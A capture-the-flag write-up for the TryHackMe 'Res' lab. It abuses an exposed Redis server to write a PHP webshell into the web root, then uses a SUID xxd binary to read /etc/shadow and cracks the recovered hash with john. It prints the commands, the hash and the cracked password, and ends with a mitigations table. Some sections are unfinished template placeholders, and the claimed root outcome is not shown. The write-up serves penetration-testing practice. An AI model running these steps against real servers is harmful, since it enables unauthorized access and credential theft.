[Res](https://tryhackme.com/room/res)


**Date:** [21/05/2025]  
**Difficulty:** [Easy]  
**Objective:** Hack into a vulnerable database server with an in-memory data-structure in this semi-guided challenge!

---

## Table of Contents

- [1. Summary](#1-summary)
- [2. Methodology](#2-methodology)
- [3. Reconnaissance](#3-reconnaissance)
- [4. Enumeration](#4-enumeration)
- [5. Exploitation](#5-exploitation)
- [6. Privilege Escalation](#6-privilege-escalation)
- [7. Post Exploitation](#7-post-exploitation)
- [8. Flags / Proof](#8-flags--proof)
- [9. Mitigations](#9-mitigations)
- [10. Notes](#10-notes)

---

## 1. Summary

**IP/URL:** [10.10.171.200]  
**Service/Ports:** [e.g., 6379/tcp, 80/HTTP]  
**Entry Point:** [redis service]  
**Privilege Escalation:** [SUID binary (xxd)]  
**Outcome:** [Root shell obtained, flags captured]  

---

## 2. Methodology

Following the PTES (Penetration Testing Execution Standard):
1. Reconnaissance  
2. Scanning & Enumeration  
3. Exploitation  
4. Privilege Escalation  
5. Post-Exploitation  
6. Reporting

---

## 3. Reconnaissance

### Passive
- Subdomain enumeration
- WHOIS
- Google dorking

## Active

nmap -sS -sV -p- 10.10.171.200       
```
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
6379/tcp open  redis   Redis key-value store 6.0.7
```


----

## 5. Exploitation

 Redis Access:

    Include commands/tools used:
´´´
    redis-cli -h 10.10.171.200 -p 6379

    10.10.171.200:6379> help
    redis-cli 7.0.15

To get help about Redis commands type:
     "help @<group>" to get a list of commands in <group>
      "help <command>" for help on <command>
      "help <tab>" to get a list of possible help topics
      "quit" to exit

To set redis-cli preferences:
      ":set hints" enable online hints
      ":set nohints" disable online hints
Set your preferences in ~/.redisclirc`
´´´

Checked if Writing Files allowed and created a shell payload:

´´´
10.10.171.200:6379> config set dir /var/www/html
OK
10.10.171.200:6379> config set dbfilename shell.php
OK
10.10.171.200:6379> set payload "<?php system($_GET['cmd']); ?>"
OK
10.10.171.200:6379> save
OK
´´´

Created a listener:
´´´
nc -lvnp 4444
´´´

Gained Access As: www-data


----

## 6. Privilege Escalation

    Method: SUID

    Tool Used: xxd, GTFOBins

    Commands:
´´´
whoami
sudo -l
ls -la
ls /home/vianka
env
cat /etc/crontab
find / -perm -4000 -type f 2>/dev/null
´´´

Findings:

´´´´
First flag in: /home/vianka/user.txr
´´´


/usr/bin/xxd

GTOFBins:
LFILE=/etc/shadow
xxd "$LFILE" | xxd -r

Now, able to read the /etc/shadow file:
´´´
vianka:$6$2p.tSTds$qWQfsXwXOAxGJUBuq2RFXqlKiql3jxlwEWZP6CWXm7kIbzR6WzlxHR.UHmi.hc1/TuUOUBo/jWQaQtGSXwvri0:18507:0:99999:7:::
´´´

To crack the password:
´´´
echo '$6$2p.tSTds$qWQfsXwXOAxGJUBuq2RFXqlKiql3jxlwEWZP6CWXm7kIbzR6WzlxHR.UHmi.hc1/TuUOUBo/jWQaQtGSXwvri0' > shadow.txt
john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt
sing default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE2 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
beautiful1       (?)     
1g 0:00:00:00 DONE (2025-05-21 10:22) 1.886g/s 2415p/s 2415c/s 2415C/s kucing..poohbear1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
´´´ 
su vianka
´´´

Escalated To: vianka

----

## 7. Post Exploitation

    Passwords: beautiful1 

    Hashes: $6$2p.tSTds$qWQfsXwXOAxGJUBuq2RFXqlKiql3jxlwEWZP6CWXm7kIbzR6WzlxHR.UHmi.hc1/TuUOUBo/jWQaQtGSXwvri0

    Escalated To: vianka for last flag inside /root/root.txt

----

## 8. Flags / Proof

    User Flag: thm{red1s_rce_w1t***********}

    Root Flag: thm{xxd_pr**********}

    Other Credentials / Loot:

        
----

## 9. Mitigations

| Vulnerability              | Risk   | Suggested Mitigation                                                                                                                                  |
|----------------------------|--------|-------------------------------------------------------------------------------------------------------------------------------------------------------|
| Redis Server Exposure      | High   | Add requirepass StrongPassword in redis.conf to force login;  Block port 6379 externally. Allow only trusted IPs via iptables, ufw, or cloud firewall.|     
| SUID on xxd                | High   | Remove SUID Bit from Unnecessary Binaries                                                                                                             |
| Weak Password              |High    | Enforce long, complex passwords with expiration policies.                                                                                             |

----

## 10. Notes

    Time spent: [e.g., 1 hour]

    Tools used: nmap, redis-cli, xxd

    Lessons learned: [Used Redis to drop a PHP reverse shell in the web root by abusing CONFIG and SAVE; xxd was incorrectly SUID — uncommon and dangerous. Misconfigurations are low-hanging fruit — but they’re often all it takes.]
    Lessons learned: [Add reflections]
